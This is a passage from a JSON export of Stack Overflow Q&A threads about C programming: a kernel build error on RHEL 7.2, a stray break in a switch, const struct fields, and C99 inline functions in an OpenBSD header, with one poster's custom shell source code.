"display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "edited": false, "score": 0, "creation_date": 1461745922, "post_id": 36884202, "comment_id": 61333684, "body": "You are not compiling the Linux kernel, you are compiler some userspace programs."}, {"owner": {"reputation": 3177, "user_id": 1221236, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/230d4a82674b9e02c0b95e4ecf7468ae?s=128&d=identicon&r=PG", "display_name": "dragosht", "link": "https://stackoverflow.com/users/1221236/dragosht"}, "edited": false, "score": 0, "creation_date": 1461746201, "post_id": 36884202, "comment_id": 61333862, "body": "You seem to be needing some additional linker flags somewhere when compiling some tool needed for the kernel build. However it&#39;s not clear to me where the error is since you&#39;re truncating the build output - Please add some log messages instead of an external link to an image: <a href=\"http://superuser.com/questions/139701/unlinked-libraries-in-a-makefile\" title=\"unlinked libraries in a makefile\">superuser.com/questions/139701/unlinked-libraries-in-a-makef&zwnj;&#8203;ile</a>"}], "owner": {"reputation": 11, "user_id": 6260309, "user_type": "registered", "profile_image": "https://graph.facebook.com/1047375295355868/picture?type=large", "display_name": "Sumit Somani", "link": "https://stackoverflow.com/users/6260309/sumit-somani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 31, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1461745282, "creation_date": 1461745282, "question_id": 36884202, "link": "https://stackoverflow.com/questions/36884202/installation-of-kernel-in-rhel7-2", "title": "Installation of Kernel in RHEL7.2", "body": "<p>I am trying to install latest stable kernel i.e 4.5 in rhel7.2 , but while I was compiling it I met with some errors,here are the steps: \n1. make mrproper \n2. make menuconfig \n3. make bzImage ,\n While I was doing make bzImage I got :</p>\n\n<p><a href=\"http://i.stack.imgur.com/jBaMA.png\" rel=\"nofollow\">compilation errors</a></p>\n\n<p>Can anyone tell me how to remove these errors . I have done a lot of steps .</p>\n\n<p>Thanks in advance :)</p>\n"}, {"tags": ["c", "switch-statement", "break"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 6, "creation_date": 1461745208, "post_id": 36884120, "comment_id": 61333217, "body": "That looks like the remaining of a poor code cleanup to me..."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1461746335, "post_id": 36884120, "comment_id": 61333958, "body": "@JoachimPileborg this doesn&#39;t do anything unexpected. Even if the <code>switch</code> is in a loop, the stray <code>break</code> is a NOP."}], "answers": [{"tags": [], "owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "is_accepted": false, "score": 2, "last_activity_date": 1461745268, "creation_date": 1461745268, "answer_id": 36884199, "question_id": 36884120, "link": "https://stackoverflow.com/questions/36884120/standalone-break-within-a-switch-statement/36884199#36884199", "title": "standalone break within a switch statement", "body": "<p>That statement, along any other statements that is not in a <code>case</code> clause in <code>switch</code> statement are unreachable code, aka dead code. That means they will not be run anyway. It is not recommended to use them.</p>\n"}, {"comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1461745890, "post_id": 36884254, "comment_id": 61333672, "body": "I actually wonder why the standard allows anything else than variable declarations before the first case."}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1461746478, "post_id": 36884254, "comment_id": 61334049, "body": "@MichaelWalz That&#39;s the same situation as in <code>if (foo) { return; } else { return; } return;</code>, there is dead code, but it must be valid code."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "edited": false, "score": 0, "creation_date": 1461746604, "post_id": 36884254, "comment_id": 61334132, "body": "@fluter sure, but the standard could forbid such constructs because <i>any</i> statements other than declarations before the first <code>case</code> will have no effect."}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 4, "last_activity_date": 1461745454, "creation_date": 1461745454, "answer_id": 36884254, "question_id": 36884120, "link": "https://stackoverflow.com/questions/36884120/standalone-break-within-a-switch-statement/36884254#36884254", "title": "standalone break within a switch statement", "body": "<p><strong>TL;DR</strong> That <code>break</code> statement is ineffective and a dead-code. Control will never reach there.</p>\n\n<p><code>C11</code> standard has a pretty good example of a similar case, let me quote that straight.</p>\n\n<p>From Chapter \u00a76.8.4.2/7, (<em>emphasis mine</em>)</p>\n\n<blockquote>\n  <p>EXAMPLE In the artificial program fragment</p>\n\n<pre><code>switch (expr)\n{\n    int i = 4;\n    f(i);\ncase 0:\n    i = 17;\n    /* falls through into default code */\ndefault:\n    printf(\"%d\\n\", i);\n}\n</code></pre>\n  \n  <p>the object whose identifier is <code>i</code> exists with automatic storage duration (within the block) but <strong>is never\n  initialized,</strong> and thus if the controlling expression has a nonzero value, the call to the <code>printf</code> function will\n  access an indeterminate value. Similarly, the <strong>call to the function <code>f</code> cannot be reached.</strong></p>\n</blockquote>\n"}], "owner": {"reputation": 1342, "user_id": 5508532, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/67f7923644113e4d8897b755a75b8272?s=128&d=identicon&r=PG&f=1", "display_name": "binary01", "link": "https://stackoverflow.com/users/5508532/binary01"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 1, "accepted_answer_id": 36884254, "answer_count": 2, "score": 4, "last_activity_date": 1461745583, "creation_date": 1461745063, "last_edit_date": 1461745583, "question_id": 36884120, "link": "https://stackoverflow.com/questions/36884120/standalone-break-within-a-switch-statement", "title": "standalone break within a switch statement", "body": "<p>I stumbled upon this code, which works as expected:</p>\n\n<pre><code>switch (ev-&gt;deviceType) {\n\n    break;\n\n    case DEVICE_TS1E0:\n        //some code\n        break;\n\n    case DEVICE_TS1E3:\n       //some code\n       break;\n\n    default:\n        //some logging\n        break;\n}\n</code></pre>\n\n<p>Now, there's a lonesome <code>break;</code> at the start of the switch, which appears to have no effect.</p>\n\n<p>Is there any circumstances where that <code>break;</code> would have an effect ? </p>\n"}, {"tags": ["c", "structure", "constants"], "comments": [{"owner": {"reputation": 8978, "user_id": 2223579, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/wQuP6.jpg?s=128&g=1", "display_name": "BlackMamba", "link": "https://stackoverflow.com/users/2223579/blackmamba"}, "edited": false, "score": 3, "creation_date": 1461745095, "post_id": 36884048, "comment_id": 61333133, "body": "You can make the entire instance constant, when you create it, since constant variables can be initialized:"}, {"owner": {"reputation": 494, "user_id": 3974475, "user_type": "registered", "accept_rate": 33, "profile_image": "https://i.stack.imgur.com/wtCtx.jpg?s=128&g=1", "display_name": "K.H.A.J.A.S", "link": "https://stackoverflow.com/users/3974475/k-h-a-j-a-s"}, "reply_to_user": {"reputation": 8978, "user_id": 2223579, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/wQuP6.jpg?s=128&g=1", "display_name": "BlackMamba", "link": "https://stackoverflow.com/users/2223579/blackmamba"}, "edited": false, "score": 0, "creation_date": 1461745744, "post_id": 36884048, "comment_id": 61333568, "body": "@BlackMamba that worked, thanks."}], "answers": [{"comments": [{"owner": {"reputation": 8978, "user_id": 2223579, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/wQuP6.jpg?s=128&g=1", "display_name": "BlackMamba", "link": "https://stackoverflow.com/users/2223579/blackmamba"}, "edited": false, "score": 0, "creation_date": 1461745244, "post_id": 36884082, "comment_id": 61333242, "body": "why this is ok for inner struct? say the detial"}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "reply_to_user": {"reputation": 8978, "user_id": 2223579, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/wQuP6.jpg?s=128&g=1", "display_name": "BlackMamba", "link": "https://stackoverflow.com/users/2223579/blackmamba"}, "edited": false, "score": 0, "creation_date": 1461745375, "post_id": 36884082, "comment_id": 61333328, "body": "@BlackMamba What? The location of the <code>typedef</code> doesn&#39;t matter here, I just prefer to not clutter the global scope."}, {"owner": {"reputation": 8978, "user_id": 2223579, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/wQuP6.jpg?s=128&g=1", "display_name": "BlackMamba", "link": "https://stackoverflow.com/users/2223579/blackmamba"}, "edited": false, "score": 0, "creation_date": 1461745444, "post_id": 36884082, "comment_id": 61333374, "body": "You move <code>typedef struct {         const int x, y;     } A;</code> to the inner of <code>int main(){}</code>"}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "reply_to_user": {"reputation": 8978, "user_id": 2223579, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/wQuP6.jpg?s=128&g=1", "display_name": "BlackMamba", "link": "https://stackoverflow.com/users/2223579/blackmamba"}, "edited": false, "score": 0, "creation_date": 1461746112, "post_id": 36884082, "comment_id": 61333807, "body": "@BlackMamba Yes, but that&#39;s just since it&#39;s a local thing, and this program has just <code>main()</code>. No need to make things global that don&#39;t have to be global."}, {"owner": {"reputation": 11698, "user_id": 5399734, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/2162d669508364bb0c03aba1a2473aa8?s=128&d=identicon&r=PG&f=1", "display_name": "nalzok", "link": "https://stackoverflow.com/users/5399734/nalzok"}, "edited": false, "score": 0, "creation_date": 1461750815, "post_id": 36884082, "comment_id": 61337088, "body": "But why this one works while OP&#39;s code throws a compilation error? (On my machine no errors are thrown when compiling OP&#39;s code)"}], "tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": true, "score": 11, "last_activity_date": 1461744924, "last_edit_date": 1495541305, "creation_date": 1461744924, "answer_id": 36884082, "question_id": 36884048, "link": "https://stackoverflow.com/questions/36884048/cant-make-structures-field-as-constant-in-c/36884082#36884082", "title": "Can&#39;t make structure&#39;s field as constant in C", "body": "<p>That should be fine, but of course you can't assign to them, only use initialization.</p>\n\n<p>So it doesn't make a lot of sense to allocate an instance on the heap.</p>\n\n<p>This works:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    typedef struct {\n        const int x, y;\n    } A;\n    A my_a = { 12, 13 };\n    printf(\"x=%d\\ny=%d\\n\", my_a.x, my_a.y);\n    return 0;\n}\n</code></pre>\n\n<p>It prints:</p>\n\n<pre><code>x=12\ny=13\n</code></pre>\n\n<p>Also, <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">please don't cast the return value of <code>malloc()</code></a> in C.</p>\n"}, {"tags": [], "owner": {"reputation": 2533, "user_id": 2925287, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/821554321/picture?type=large", "display_name": "Pierre Emmanuel Lallemant", "link": "https://stackoverflow.com/users/2925287/pierre-emmanuel-lallemant"}, "is_accepted": false, "score": -1, "last_activity_date": 1461746832, "last_edit_date": 1461746832, "creation_date": 1461745068, "answer_id": 36884123, "question_id": 36884048, "link": "https://stackoverflow.com/questions/36884048/cant-make-structures-field-as-constant-in-c/36884123#36884123", "title": "Can&#39;t make structure&#39;s field as constant in C", "body": "<p>You can't. \nWith POO in C you can disable the modification of those fields, if you:</p>\n\n<ul>\n<li>define getters: <code>char A_get_x(A *p);</code> and <code>char A_get_y(A *p);</code></li>\n<li>define the struct in the .c to hide its implementation</li>\n<li>only write <code>typedef struct A A;</code> in the .h file, to allow to use that type.</li>\n<li>define a constructor : <code>A *A_new();</code> which returns A with the values desired on x and y.</li>\n</ul>\n\n<p>By doing this, you can only modify the values in the constructor, and after the object is created the values wont change (if you dont force the values with pointers etc..)</p>\n"}, {"tags": [], "owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "is_accepted": false, "score": -1, "last_activity_date": 1461745719, "creation_date": 1461745719, "answer_id": 36884340, "question_id": 36884048, "link": "https://stackoverflow.com/questions/36884048/cant-make-structures-field-as-constant-in-c/36884340#36884340", "title": "Can&#39;t make structure&#39;s field as constant in C", "body": "<p>First, you should use <code>malloc</code> to allocate the size of the struct, not a magic number 2. Also, don't cast <code>malloc</code> return value, it is automatically promoted to the compatible pointer type.</p>\n\n<pre><code>a1 = malloc(sizeof(A));\n</code></pre>\n\n<p>Second, there isn't really not much use to make struct member <code>const</code>.</p>\n\n<pre><code>A *a1;\na1 = malloc(sizeof(A));\n</code></pre>\n\n<p><code>a1</code>'s members are not initialized to any state here, yet the compiler forbidden any assignments to them, since it is defined as const, so <code>a1-&gt;x = 'a';</code> won't compile.</p>\n\n<pre><code>A a2;\na2-&gt;x = 'a'; // won't compile too\n</code></pre>\n\n<p>The only valid use case is:</p>\n\n<pre><code>A a3 = {'a', 'b'};\n</code></pre>\n"}], "owner": {"reputation": 494, "user_id": 3974475, "user_type": "registered", "accept_rate": 33, "profile_image": "https://i.stack.imgur.com/wtCtx.jpg?s=128&g=1", "display_name": "K.H.A.J.A.S", "link": "https://stackoverflow.com/users/3974475/k-h-a-j-a-s"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 649, "favorite_count": 1, "accepted_answer_id": 36884082, "answer_count": 3, "score": 5, "last_activity_date": 1461746832, "creation_date": 1461744829, "last_edit_date": 1461745014, "question_id": 36884048, "link": "https://stackoverflow.com/questions/36884048/cant-make-structures-field-as-constant-in-c", "title": "Can&#39;t make structure&#39;s field as constant in C", "body": "<p>When I declare structure given below, it is throwing compilation error. </p>\n\n<pre><code>typedef struct{\n    const char x; //it is throwing compilation error\n    const char y;\n}A;\n\nvoid main()\n{\n    A *a1;\n    a1 = (A*)malloc(2);\n}\n</code></pre>\n\n<p>How can I make structure's field (characters <code>x</code> and <code>y</code>) as constant?</p>\n"}, {"tags": ["c", "header", "inline", "c89", "openbsd"], "comments": [{"owner": {"reputation": 89221, "user_id": 10320, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/pijgr.jpg?s=128&g=1", "display_name": "dreamlax", "link": "https://stackoverflow.com/users/10320/dreamlax"}, "edited": false, "score": 1, "creation_date": 1461744892, "post_id": 36883913, "comment_id": 61332971, "body": "Can you post your <code>main.c</code> file?"}], "answers": [{"comments": [{"owner": {"reputation": 89221, "user_id": 10320, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/pijgr.jpg?s=128&g=1", "display_name": "dreamlax", "link": "https://stackoverflow.com/users/10320/dreamlax"}, "edited": false, "score": 1, "creation_date": 1461744930, "post_id": 36884055, "comment_id": 61333010, "body": "You shouldn&#39;t need any special flags to be able to include <code>ctype.h</code>."}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 89221, "user_id": 10320, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/pijgr.jpg?s=128&g=1", "display_name": "dreamlax", "link": "https://stackoverflow.com/users/10320/dreamlax"}, "edited": false, "score": 1, "creation_date": 1461744998, "post_id": 36884055, "comment_id": 61333062, "body": "The problem is not about <code>ctype.h</code>, it&#39;s about <code>inline</code> functions."}, {"owner": {"reputation": 89221, "user_id": 10320, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/pijgr.jpg?s=128&g=1", "display_name": "dreamlax", "link": "https://stackoverflow.com/users/10320/dreamlax"}, "edited": false, "score": 1, "creation_date": 1461745026, "post_id": 36884055, "comment_id": 61333086, "body": "The screenshot shows that the compiler is complaining about the use of inline functions in <code>ctype.h</code>."}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 89221, "user_id": 10320, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/pijgr.jpg?s=128&g=1", "display_name": "dreamlax", "link": "https://stackoverflow.com/users/10320/dreamlax"}, "edited": false, "score": 1, "creation_date": 1461750427, "post_id": 36884055, "comment_id": 61336799, "body": "The include of a header file is not the problem, it&#39;s the content in it that cause problems. The <code>#include</code> directive does not even exists in compiling phase."}, {"owner": {"reputation": 89221, "user_id": 10320, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/pijgr.jpg?s=128&g=1", "display_name": "dreamlax", "link": "https://stackoverflow.com/users/10320/dreamlax"}, "edited": false, "score": 1, "creation_date": 1461753748, "post_id": 36884055, "comment_id": 61339186, "body": "The problem lies in the <code>ctype.h</code> header, which is a standard header file. You shouldn&#39;t need to choose a particular dialect of C in order to be able to include this file."}], "tags": [], "owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "is_accepted": true, "score": 0, "last_activity_date": 1461744852, "creation_date": 1461744852, "answer_id": 36884055, "question_id": 36883913, "link": "https://stackoverflow.com/questions/36883913/openbsd-5-9-header-with-c99-inline-function/36884055#36884055", "title": "OpenBSD 5.9 header with C99 inline function", "body": "<p>You should compile with c99 or c11, and the flags to gcc:</p>\n\n<pre><code>gcc -std=c99\n</code></pre>\n\n<p>or</p>\n\n<pre><code>gcc -std=c11\n</code></pre>\n"}], "owner": {"reputation": 22041, "user_id": 108207, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/dd8608b8b423bdcbda3fe5c0cf8b6230?s=128&d=identicon&r=PG&f=1", "display_name": "Niklas R.", "link": "https://stackoverflow.com/users/108207/niklas-r"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 135, "favorite_count": 0, "accepted_answer_id": 36884055, "answer_count": 1, "score": -1, "last_activity_date": 1461756120, "creation_date": 1461744368, "last_edit_date": 1461756120, "question_id": 36883913, "link": "https://stackoverflow.com/questions/36883913/openbsd-5-9-header-with-c99-inline-function", "title": "OpenBSD 5.9 header with C99 inline function", "body": "<p>I'm building a custom shell and  see when I compile that <code>usr/include/ctype.h:92</code> seem to require <a href=\"/questions/tagged/c99\" class=\"post-tag\" title=\"show questions tagged &#39;c99&#39;\" rel=\"tag\">c99</a> <a href=\"/questions/tagged/inline\" class=\"post-tag\" title=\"show questions tagged &#39;inline&#39;\" rel=\"tag\">inline</a> function but the compiler says that <code>C99</code> inline functions are not supported. The warning can be disabled with a parameter to the compiler but is it a bug that needs a fix?</p>\n\n<p><a href=\"https://i.stack.imgur.com/Q7Cl6.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Q7Cl6.png\" alt=\"enter image description here\"></a></p>\n\n<p>This is my <code>main.c</code></p>\n\n<pre><code>#define _XOPEN_SOURCE 500\n\n#include &lt;sys/stat.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;sys/wait.h&gt;\n#include \"openshell.h\"\n#include \"errors.h\"\n#include &lt;errno.h&gt;\n#include &lt;locale.h&gt;\n#include &lt;readline/readline.h&gt;\n#include &lt;getopt.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;readline/history.h&gt;\n#ifdef SIGDET\n#if SIGDET == 1\nint isSignal = 1;       /*Termination detected by signals*/\n#endif\n#endif\nstatic int sourceCount = 0;\nstatic FILE *sourcefiles[MAX_SOURCE];\n/*\n * The special maximum argument value which means that there is\n * no limit to the number of arguments on the command line.\n */\n#define    INFINITE_ARGS    0x7fffffff\n\n\n/*\n * The table of built-in commands.\n * A command is terminated wih an entry containing NULL values.\n */\nstatic const CommandEntry commandEntryTable[] =\n        {\n                {\n                        \"checkenv\", do_checkenv, 1, INFINITE_ARGS,\n                        \"Check environment variables\",\n                        \"\"\n                },\n\n                {\n                        \"add2path\", do_add2path, 3, INFINITE_ARGS,\n                        \"do_add2path\",\n                        \"[txp]v arFileName fileName ...\"\n                },\n\n                {\n                        \"cd\",       do_cd,       1, 2,\n                        \"Change current directory\",\n                        \"[dirName]\"\n                },\n\n\n                {\n                        \"exit\",     do_exit,     1, 2,\n                        \"Exit from shell\",\n                        \"[exit value]\"\n                },\n\n\n                {\n                        \"help\",     do_help,     1, 2,\n                        \"Print help about a command\",\n                        \"[word]\"\n                },\n\n                {\n                        \"kill\",     do_kill,     2, INFINITE_ARGS,\n                        \"Send a signal to the specified process\",\n                        \"[-sig] pid ...\"\n                },\n\n\n                {\n                        NULL,       0,           0, 0,\n                        NULL,\n                        NULL\n                }\n        };\n\nstruct command {\n    char *const *argv;\n};\nchar** str_split(char* a_str, const char a_delim)\n{\n    char** result    = 0;\n    size_t count     = 0;\n    char* tmp        = a_str;\n    char* last_comma = 0;\n    char delim[2];\n    delim[0] = a_delim;\n    delim[1] = 0;\n\n    /* Count how many elements will be extracted. */\n    while (*tmp)\n    {\n        if (a_delim == *tmp)\n        {\n            count++;\n            last_comma = tmp;\n        }\n        tmp++;\n    }\n\n    /* Add space for trailing token. */\n    count += last_comma &lt; (a_str + strlen(a_str) - 1);\n\n    /* Add space for terminating null string so caller\n       knows where the list of returned strings ends. */\n    count++;\n\n    result = malloc(sizeof(char*) * count);\n\n    if (result)\n    {\n        size_t idx  = 0;\n        char* token = strtok(a_str, delim);\n\n        while (token)\n        {\n            assert(idx &lt; count);\n            *(result + idx++) = strdup(token);\n            token = strtok(0, delim);\n        }\n        assert(idx == count - 1);\n        *(result + idx) = 0;\n    }\n\n    return result;\n}\nchar ** stripped;\nchar ** create_pipeline(int argc, char ** argv) {\n    if(!strstr(argv[argc], \"|\")) { /* &amp;&amp; ! isBetweenquotes*/\n        stripped = argv;\n        return stripped;\n\n    }\n    else {\n    stripped = argv;\n    return create_pipeline(argc, argv);\n    }\n}\n\nstatic int runCmd(const char *cmd) {\n    const char *cp;\n    pid_t pid;\n    int status;\n    struct command shellcommand[4];\n    char **argv = 0;\n    int argc = 1;\n    bool pipe = false;\n    char *command[40];\n    char *cmd2[20] = {\"cmd2\", 0};\n    int numberofpipelines = 0;\n    unsigned long i3 = 0;\n    unsigned long i2 = 0;\n    unsigned long i1 = 0;\n    unsigned long n = 0;\n    char *string;\n    char *string1;\n    int max_args = 1; /* there's at least one argument or we wouldn't reach this */\n    cmd2[0] = NULL;\n    cmd2[1] = NULL;\n    cmd2[2] = NULL;\n    command[0] = NULL;\n    command[1] = NULL;\n    command[3] = NULL;\n    char *string2 = NULL;\n    char** tokens;\n    for (cp = cmd; *cp; cp++) {\n        if ((*cp &gt;= 'a') &amp;&amp; (*cp &lt;= 'z')) {\n            continue;\n        }\n        if ((*cp &gt;= 'A') &amp;&amp; (*cp &lt;= 'Z')) {\n            continue;\n        }\n        if (isDecimal(*cp)) {\n            continue;\n        }\n        if (isBlank(*cp)){\n            continue;\n        }\n        if ((*cp == '.') || (*cp == '/') || (*cp == '-') ||\n            (*cp == '+') || (*cp == '=') || (*cp == '_') ||\n            (*cp == ':') || (*cp == ',') || (*cp == '\\'') ||\n            (*cp == '\"')) {\n            continue;\n        }\n    }\n    makeArgs(cmd, &amp;argc, (const char ***) &amp;argv, pipe);\n    char a[20] = {0};\n    if (sscanf(cmd, \"%*[^']'%[^']'\", a) == 1) {\n        printf(\"&lt;undefined&gt;\");\n    }\n\n\n    char cmdtmp[75];\n    strcpy(cmdtmp, cmd);\n\n    tokens = str_split( cmdtmp, '|');\n\n    if (tokens)\n    {\n        int i;\n        for (i = 0; *(tokens + i); i++)\n        {\n            printf(\"month=[%s]\\n\", *(tokens + i));\n            free(*(tokens + i));\n        }\n        printf(\"\\n\");\n        free(tokens);\n    }\n    for (int i = 0; i &lt; argc; i++) {\n        if (argv[i] != NULL &amp;&amp; strstr(argv[i], \"|\")) {\n\n\n\n\n            numberofpipelines++;\n            char subbuff[40];\n            i1 = 0;\n            i2 = 0;\n            i3 = 0;\n            subbuff[0]='\\0';\n            string = strstr(argv[i], \"|\");\n            if (string != NULL) {\n                i3 = string - argv[i];\n                printf(\"**** is null ***\");\n                cmd2[1] = argv[argc - 1];\n            }\n            string1 = strstr(&amp;argv[i][i3 + 2], \"|\");\n            if (string1 != NULL) {\n                i2 = string1 - argv[i3 + 1];\n                printf(\"i2: %lu\", i2);\n            } else {\n                char *found3 = strstr(&amp;argv[i][i3 + 1], \" \");\n                if (found3 != NULL) {}\n                string2 = strstr(argv[1], \"|\");\n                if (string2 != NULL) {\n                    i1 = string2 - argv[1];\n                }\n                n = strlen(argv[1]) - i1;\n                if (argc &gt; 2) {\n                    memcpy(subbuff, &amp;argv[i][i3 + 1], n - 1);\n                    subbuff[n - 1] = '\\0';\n                    cmd2[0] = subbuff;\n                    cmd2[1] = argv[argc - 1];\n                } else {\n                    memcpy(subbuff, &amp;argv[i][i3 + 1], n);\n                    subbuff[n] = '\\0';\n                    cmd2[0] = subbuff;\n                    cmd2[1] = argv[argc - 1];\n                }\n                argc++;\n                argv[i + 1] = subbuff;\n                command[i] = \"&lt;undefined&gt;\";\n                argv[i + 2] = NULL;\n                max_args = i;\n            }\n        }\n        if (argv[i] != NULL) {\n            if (i &lt; max_args) {\n                command[i] =  argv[i];\n                command[i+1] =  0;\n                max_args++;\n                cmd2[1] = argv[argc - 1];\n            } else {\n                command[max_args] =  argv[max_args];\n                command[max_args+1] =  0;\n                cmd2[1] = argv[argc - 1];\n            }\n        }\n        if (argv[i] != NULL) {\n            char *p = strchr(argv[i], '|');\n            if (!p) {\n                /* deal with error: / not present\" */;\n            } else {\n                *p = 0;\n            }\n        }\n\n    }\n    dump_argv((const char *) \"d\", argc, argv);\n/*  makeArgs(cmd, &amp;argc, &amp;argv, pipe);*/\n /*   command[2]= 0;*/\n    shellcommand[0].argv = command;\n    shellcommand[1].argv = cmd2;\n    pid = fork();\n    if (pid &lt; 0) {\n        perror(\"fork failed\");\n        return -1;\n    }\n    /* If we are the child process, then go execute the program.*/\n    if (pid == 0) {\n        /* spawn(cmd);*/\n        fork_pipes(numberofpipelines, shellcommand);\n    }\n    /*\n     * We are the parent process.\n     * Wait for the child to complete.\n     */\n    status = 0;\n    while (((pid = waitpid(pid, &amp;status, 0)) &lt; 0) &amp;&amp; (errno == EINTR));\n    if 